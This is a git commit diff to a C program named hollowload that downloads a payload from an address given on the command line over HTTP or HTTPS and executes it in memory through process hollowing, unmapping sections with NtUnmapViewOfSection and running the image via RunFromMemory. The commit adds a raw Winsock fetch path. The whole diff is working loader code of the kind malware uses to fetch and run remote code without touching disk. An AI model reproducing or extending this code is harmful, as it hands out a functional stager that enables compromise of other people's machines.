413f6349df0e5fc37bda0888e3f5bd878c66dd9a
Jacob Moody <moody@posixcafe.org>
2021-01-19 18:29:23 -0600

    Add back http method for fetching for testing

--- hollowload/hollowload.c
+++ hollowload/hollowload.c
@@ -3,11 +3,15 @@
 #endif
 
 #include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <winhttp.h>
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "Ws2_32.lib")
 
 typedef long int (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
 NtUnmapViewOfSectionF NtUnmapViewOfSection;
@@ -97,6 +101,7 @@ RunFromMemory(char* pImage, int argc, char *argv[])
 			jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
 		else
 		{
+			printf("going the scummy route\n");
 			jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
 			jmpSize += 1;
 			jmpSize *= INH.OptionalHeader.SectionAlignment;
@@ -198,6 +203,8 @@ dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target)
 	// Specify an HTTP server.
 	if (hSession)
 		hConnect = WinHttpConnect( hSession, addr, port, 0);
+	else
+		printf("Failed to create session\n");
 
 	const char *mimes[] = {
 		"application/octet-stream",
@@ -245,10 +252,120 @@ dohttpreq(LPCWSTR addr, INTERNET_PORT port, LPCWSTR target)
 	return out;
 }
 
+
+/* SOCKET is a struct(?), 0 signifies error */
+SOCKET
+wsockinit(char *addr, char *port)
+{
+	WSADATA wsaData;
+	int iResult;
+
+	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+	if (iResult != 0) {
+		printf("WSAStartup failed: %d\n", iResult);
+		return 0;
+	}
+
+	struct addrinfo *result = NULL,
+		*ptr = NULL,
+		hints;
+
+	ZeroMemory( &hints, sizeof(hints) );
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	// Resolve the server address and port
+	iResult = getaddrinfo(addr, port, &hints, &result);
+	if (iResult != 0) {
+		printf("getaddrinfo failed: %d\n", iResult);
+		WSACleanup();
+		return 0;
+	}
+
+	SOCKET ConnectSocket = INVALID_SOCKET;
+
+	// Attempt to connect to the first address returned by
+	// the call to getaddrinfo
+	ptr=result;
+
+	// Create a SOCKET for connecting to server
+	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
+		ptr->ai_protocol);
+
+	if (ConnectSocket == INVALID_SOCKET) {
+		printf("Error at socket(): %ld\n", WSAGetLastError());
+		freeaddrinfo(result);
+		WSACleanup();
+		return 0;
+	}
+
+	// Connect to server.
+	iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+	    closesocket(ConnectSocket);
+	    ConnectSocket = INVALID_SOCKET;
+	}
+
+	// Should really try the next address returned by getaddrinfo
+	// if the connect call failed
+	// But for this simple example we just free the resources
+	// returned by getaddrinfo and print an error message
+
+	freeaddrinfo(result);
+
+	if (ConnectSocket == INVALID_SOCKET) {
+		printf("Unable to connect to server!\n");
+		WSACleanup();
+		return 1;
+	}
+
+	return ConnectSocket;
+}
+
+
+char*
+readpayload(SOCKET s, char *target)
+{
+	const char reqtemp[] = "GET /%s HTTP/1.0\n\r\n\r";
+	char *req = (char*)malloc(strlen(target) + sizeof(reqtemp)-2);
+	int reqlen = sprintf(req, reqtemp, target);
+	int result;
+
+	int recvcount = 0;
+	int size = 256;
+	char *recvbuf = (char*)malloc(size);
+
+	result = send(s, req, reqlen, 0);
+	if(result == SOCKET_ERROR){
+		printf("Send failed: %d\n", WSAGetLastError());
+		closesocket(s);
+		WSACleanup();
+		return NULL;
+	}
+	shutdown(s, SD_SEND);
+
+	do {
+		result = recv(s, recvbuf+recvcount, size-recvcount, 0);
+		if( result > 0){
+			recvcount+=result;
+			if(recvcount >  (size/2)){
+				size = size * 2;
+				recvbuf = (char*)realloc(recvbuf, size);
+			}
+		}
+	} while( result > 0);
+
+	//Strip HTTP Headers
+	char *data = strstr(recvbuf, "\r\n\r\n");
+	data+=4;
+	return data;
+}
+
 void
 usage(void)
 {
-	printf("Usage: %s address port payload\n", argv0);
+	printf("Usage: %s http|https address port payload\n", argv0);
 	exit(1);
 }
 
@@ -256,24 +373,38 @@ int
 main(int argc, char *argv[])
 {
 	setbuf(stdout, NULL);
+	char *lpMemory = NULL;
+
 	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary("ntdll.dll"), "NtUnmapViewOfSection");
 
 	argv0 = argv[0];
-	if(argc < 4)
+	if(argc < 5)
 		usage();
 
-	size_t convertedChars = 0;
-	size_t wideSize = strlen(argv[1]) + 1;
-	wchar_t* addr = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
-	mbstowcs_s(&convertedChars, addr, wideSize, argv[1], _TRUNCATE);
-	
-	wideSize = strlen(argv[3]) + 1;
-	wchar_t* target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
-	mbstowcs_s(&convertedChars, target, wideSize, argv[3], _TRUNCATE);
-	char *lpMemory = dohttpreq(addr, atoi(argv[2]), target);
-	if(lpMemory != NULL)
-		RunFromMemory(lpMemory, argc-4, argv+4);
-	else
+	if(strcmp("https", argv[1]) == 0){
+		size_t convertedChars = 0;
+		size_t wideSize = strlen(argv[2]) + 1;
+		wchar_t* addr = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
+		mbstowcs_s(&convertedChars, addr, wideSize, argv[2], _TRUNCATE);
+
+		wideSize = strlen(argv[4]) + 1;
+		wchar_t* target = (wchar_t*)malloc(wideSize * sizeof(wchar_t));
+		mbstowcs_s(&convertedChars, target, wideSize, argv[4], _TRUNCATE);
+		printf("%ls %s %ls\n", addr, argv[2], target);
+		lpMemory = dohttpreq(addr, atoi(argv[3]), target);
+	}
+	else if(strcmp("http", argv[1]) == 0){
+		SOCKET s = wsockinit(argv[2], argv[3]);
+		lpMemory = readpayload(s, argv[4]);
+	}else{
+		usage();
+	}
+
+
+	if(lpMemory != NULL){
+		printf("Running...\n");
+		RunFromMemory(lpMemory, 0, argv);
+	}else
 		printf("Could not read response\n");
 	return 0;
 }
